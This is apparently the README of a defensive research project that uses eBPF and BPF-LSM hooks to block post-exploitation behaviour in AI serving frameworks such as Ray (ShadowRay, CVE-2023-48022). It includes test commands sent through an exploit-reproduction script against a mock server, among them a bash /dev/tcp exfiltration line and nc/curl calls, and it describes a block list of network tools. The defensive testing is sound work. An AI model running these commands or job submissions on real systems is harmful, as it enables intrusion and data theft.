# kShield-VirtualPatch

eBPF 기반 AI 서빙 프레임워크 취약점 가상 패치(Virtual Patching) 연구

## 개요

AI 서빙 프레임워크(Ray, vLLM, Triton 등)에서 발견되는 원격 코드 실행(RCE) 취약점은 벤더 패치가 지연되거나(예: CVE-2023-48022, "ShadowRay"), 조직 내부적으로 업그레이드가 늦어지는 경우가 많다. 본 프로젝트는 eBPF를 이용해 애플리케이션 코드를 수정하지 않고, 알려진 취약점의 악용 시 발생하는 비정상 행위를 커널 수준에서 탐지·차단하는 가상 패치 메커니즘을 연구한다.

두 계층으로 탐지한다.
- **SHADOW_EXEC**: AI 워커 계보가 nc/ncat 등 합법적 용도가 사실상 없는 바이너리를 실행하는 순간 탐지. curl/wget은 모델·데이터셋 다운로드 등 정당한 용도가 있는 이중 용도(dual-use) 도구라 여기서 판단하지 않고 아래 SHADOW_CONNECT에 맡긴다(v4 재검토, `paper_draft.md` 3.6절).
- **SHADOW_CONNECT**: AI 워커 계보가 신뢰되지 않은 목적지로 `connect()`를 시도하는 순간 탐지 — bash `/dev/tcp/`처럼 별도 바이너리를 실행하지 않는 우회도, curl/wget도 바이너리 종류와 무관하게 목적지 기준으로 포착

신규 룰을 먼저 "탐지만, 차단은 안 함"으로 배포하고 오탐을 관찰한 뒤 실제 차단으로 전환할 수 있도록, `--audit-only` 플래그(재컴파일 불필요)를 두 컴포넌트 모두에 지원한다(v5, `paper_draft.md` 3.6절).

둘 다 "행위 발생 후 SIGKILL"이라는 공통 한계가 있어, 이를 보완하는 **3번째 계층**을 추가로 제공한다(기능 검증 완료, 아래 "LSM 기반 사전 차단" 절 참고).
- **LSM 사전 차단**(`kshield_vpatch_lsm`): `security_bprm_check_security`/`security_socket_connect` LSM 훅에서 동기적으로 `-EPERM`을 반환하여 execve()/connect() 자체를 실패시킨다. SIGKILL과 달리 "죽이기 전에 막기"이며, VM 실측으로 확인하였다. `CONFIG_BPF_LSM` 및 부팅 파라미터(`lsm=...,bpf`) 의존성이 있다.

## 배경

- **취약점 사례**: Ray의 Jobs Submission API는 기본적으로 인증 메커니즘이 없어 원격 코드 실행이 가능하다(CVE-2023-48022). Oligo Security의 조사에 따르면 수천 대의 Ray 클러스터가 실제로 침해되어 암호화폐 채굴, 역방향 셸, 크레덴셜 탈취 등에 악용되었다.
- **기존 방법의 한계**: 벤더가 "의도된 설계"라는 입장을 취하며 공식 패치를 제공하지 않거나, 조직 내부적으로 프레임워크 업그레이드에 따른 프로덕션 호환성 리스크로 패치 적용이 지연된다.
- **제안 방향**: eBPF kprobe를 이용해 정상 워크로드에서는 발생하지 않는 시스템 콜(예: AI 워커 프로세스의 셸 실행, 비인가 외부 연결)을 탐지하여 코드 변경이나 재배포 없이 즉시 차단한다. 실제 패치가 배포되면 eBPF 훅을 제거하면 된다.

## 위협 모델 (초안)

공격자는 AI 서빙 프레임워크의 관리 API(예: Ray Jobs Submission API, 기본 포트 8265)에 네트워크로 접근 가능하며, 인증 부재 취약점을 악용하여 임의 코드를 원격에서 실행시킬 수 있다. 목표는 원격 코드 실행을 통해 비정상적인 하위 프로세스 실행이나 외부 서버로의 아웃바운드 연결을 수립하여 2차 피해(암호화폐 채굴, 데이터 유출, 크레덴셜 탈취)를 유발하는 것이다.

본 연구는 취약점 악용 이후의 악성 행위 탐지에 집중하며, 취약점 자체의 진단이나 초기 침투 벡터 차단, 그리고 다룬 CVE 외의 일반화된 방어는 범위 밖으로 한다.

## 프로젝트 구조

```
kShield-VirtualPatch/
├── paper_draft.md            논문 초안 (전체 완성, 참고문헌 검증 완료)
├── setup.sh                  VM 의존성 설치 + vmlinux.h 생성 + 빌드
├── src/
│   ├── kshield_vpatch.bpf.c      커널 공간 BPF 프로그램 (SHADOW_EXEC + SHADOW_CONNECT)
│   ├── kshield_vpatch.c          사용자 공간 로더/로거
│   ├── kshield_vpatch_lsm.bpf.c  LSM 훅 기반 동기적 사전 차단, 기능·성능 검증 완료
│   ├── kshield_vpatch_lsm.c      (실험적) 위 컴포넌트의 사용자 공간 로더
│   └── Makefile
└── attack/
    ├── mock_ray_server.py      ShadowRay 취약점 재현용 목업 Jobs API
    ├── exploit_shadowray.py    공격(악성 job) 재현 스크립트
    ├── benchmark_vpatch.py     성능 오버헤드 측정 스크립트 (정상 job 반복 제출)
    └── stat_analysis.py        N회 반복 측정 + Welch's t-test 통계 분석
```

## 빠른 시작 (VM에서)

```bash
# 0) 최초 1회: 의존성 설치 + vmlinux.h 생성 + 빌드
bash setup.sh

# 1) 목업 취약 서버 실행
python3 attack/mock_ray_server.py

# 2) (다른 터미널) kShield-VirtualPatch 실행
sudo ./src/kshield_vpatch

# 3) (다른 터미널) 정상 job — 오탐 없어야 함
python3 attack/exploit_shadowray.py --cmd "echo benign-job"

# 4) 신뢰 안 된 목적지로 curl — SHADOW_CONNECT가 connect() 시점에 차단해야 함
#    (curl/wget은 exec 시점(SHADOW_EXEC)이 아닌 connect 시점에 목적지로 판단한다 — v4 재검토)
python3 attack/exploit_shadowray.py --cmd "curl http://1.1.1.1/"

# 4-b) nc 실행 — SHADOW_EXEC가 exec 시점에 즉시 차단해야 함 (합법적 용도가 없는 바이너리)
python3 attack/exploit_shadowray.py --cmd "nc 1.1.1.1 80"

# 5) 블록리스트 우회 시도 — SHADOW_CONNECT가 connect() 시점에 차단해야 함
#    (bash 내장 기능이라 curl/nc를 exec하지 않음)
python3 attack/exploit_shadowray.py --cmd "bash -c 'exec 3<>/dev/tcp/1.1.1.1/80; echo leaked >&3'"

# 5-b) --audit-only 모드: 탐지 로그만 남기고 차단은 안 함 (재컴파일 불필요)
sudo ./src/kshield_vpatch --audit-only

# 6) (나중에, 실험 단계) 성능 오버헤드 측정
python3 attack/benchmark_vpatch.py --count 500 --output metrics_vpatch_on.csv
```

`attacker.example` 같은 존재하지 않는 도메인은 DNS 조회에서 실패해 `connect()`
자체가 발생하지 않으므로, SHADOW_CONNECT 테스트에는 `1.1.1.1` 등 실제 도달
가능한 IP를 사용해야 한다.

## 상태

**v3(kprobe/tracepoint) + LSM 사전 차단 모두 기능·성능 검증 완료.** v4(curl/wget
재분류)·v5(audit-only 모드)까지 VM에서 검증하였다. 상세 수치는
`paper_draft.md` 4.4절·3.6절 참고.

VM 실측(Ubuntu, 실제 curl/bash 사용)으로 다음을 확인하였다.
- 빌드: 컴파일·CO-RE 재배치·attach(v3: kprobe/tracepoint, LSM:
  `attach_type lsm_mac`) 모두 에러 없이 성공
- 정상 job(`echo`, `python3 -c ...`, curl로 신뢰 목적지 다운로드) → 오탐 없이 통과
- 공격 체인(python3 → sh → curl, bash `/dev/tcp/` 우회) → curl/wget은
  connect 계층(SHADOW_CONNECT/LSM `socket_connect`)에서, nc/ncat은 exec
  계층(SHADOW_EXEC/LSM `bprm_check_security`)에서 각각 정확히 차단
- 성능(off/v3/v3+LSM 3개 그룹, N=10, Welch's t-test): fork 단계가 얕은
  워크로드에서는 유의미한 차이 없음. fork 집약적 워크로드에서는 처음으로
  통계적으로 유의미하지만 작은 차이(처리량 −0.67%, 지연시간 +0.7%) 관측
- audit-only 모드: 탐지 로그는 남기되 실제 차단(SIGKILL/-EPERM)은 건너뛰는
  동작을 v3·LSM 양쪽에서 확인

`paper_draft.md`에 위 결과가 전부 반영되어 있다.

## LSM 기반 사전 차단 (기능 검증 완료)

SHADOW_EXEC/SHADOW_CONNECT는 둘 다 "행위가 발생한 뒤 `bpf_send_signal(9)`로
죽이는" 방식이라, 신호가 도달하기 전에 `connect()`/`execve()`가 이미 진행될
여지를 이론적으로 배제하지 못한다. `kshield_vpatch_lsm`은 이를 보완하는
별도 컴포넌트로, `security_bprm_check_security`/`security_socket_connect`
LSM 훅에서 시스템 콜 반환값 자체를 `-EPERM`으로 대체하여 동기적으로
막는다.

**VM 실측 결과**: `lsm=...,bpf` 부팅 설정 후 빌드·attach 성공(`bpftool link
list`로 두 훅 모두 `attach_type lsm_mac` 확인). 정상 job은 오탐 없이 통과,
bash `/dev/tcp/` 우회는 `connect()` 시점에 즉시 실패(`Operation not
permitted`)로 확인. 실측 중 `suspicious_bins[]`가 `/usr/bin/curl`은 막고
`/bin/curl`(셸의 `$PATH` 재탐색 경로, 우분투에서는 동일 파일의 심볼릭 링크)은
놓치는 버그를 발견하여 `kshield_vpatch.bpf.c`(v3)와 `kshield_vpatch_lsm.bpf.c`
양쪽에서 수정하였다 — 수정 전에도 SHADOW_CONNECT/socket_connect 계층이
실제 연결 시도를 막아 데이터 유출은 없었다(defense-in-depth 실증).
성능 오버헤드는 4.4절(off/v3/v3+LSM 3개 그룹)에서 측정 완료하였다.

```bash
# 0) 사전 확인 — 둘 다 충족해야 attach가 성공한다
zgrep 'CONFIG_BPF_LSM' /boot/config-$(uname -r)   # =y 여야 함
cat /sys/kernel/security/lsm                       # "bpf"가 포함되어야 함

# "bpf"가 없다면, 아래 절차는 부팅/보안 설정 변경이므로 직접 판단 후 수행:
#   sudo nano /etc/default/grub   # GRUB_CMDLINE_LINUX에 lsm=...,bpf 추가
#   sudo update-grub && sudo reboot

# 1) 빌드 (kshield_vpatch와 함께 빌드됨)
cd src && make

# 2) 실행 — attach 실패 시 원인(커널 설정 미비 등)을 진단 메시지로 출력한다
sudo ./kshield_vpatch_lsm

# 3) (다른 터미널) 목업 서버 + 공격 재현은 기존과 동일
python3 ../attack/mock_ray_server.py
python3 ../attack/exploit_shadowray.py --cmd "curl http://1.1.1.1/"
python3 ../attack/exploit_shadowray.py --cmd "bash -c 'exec 3<>/dev/tcp/1.1.1.1/80; echo leaked >&3'"
```

위 결과는 `paper_draft.md` 3.5절에 반영되어 있다. `kshield_vpatch`(v3,
kprobe 기반)는 이 컴포넌트와 무관하게 계속 독립적으로 동작하므로, LSM
attach가 실패하는 환경(재부팅 불가 등)에서도 기본 방어선은 그대로 유지된다.

## 4장 실험: 성능 오버헤드 측정 절차 (완료, 재측정 시 참고)

```bash
# 터미널 A: mock 서버 실행 (계속 켜 둠)
python3 attack/mock_ray_server.py

# 터미널 B: [1단계] kShield-VirtualPatch 비활성 상태로 baseline 측정
python3 attack/stat_analysis.py measure --group vpatch_off --runs 10

# 터미널 B: [2단계] kShield-VirtualPatch 실행 (터미널 C에서)
sudo ./src/kshield_vpatch

# 터미널 B: [3단계] kShield-VirtualPatch 활성 상태로 측정
python3 attack/stat_analysis.py measure --group vpatch_on --runs 10

# [4단계] 두 그룹 비교 (Welch's t-test)
python3 attack/stat_analysis.py compare --compare \
    attack/results/stats_vpatch_off.csv attack/results/stats_vpatch_on.csv
```

위 절차로 측정한 결과(N=10, 처리량 p=0.7322, 지연 p=0.6956)가 `paper_draft.md`
4.4절에 반영되어 있다. SHADOW_CONNECT를 포함한 재측정 시 동일 절차를 사용한다.

관련 프로젝트: [kShield (원본, 모델 파일 보안)](https://github.com/sangheon-lee1028/Ai-ebpf)
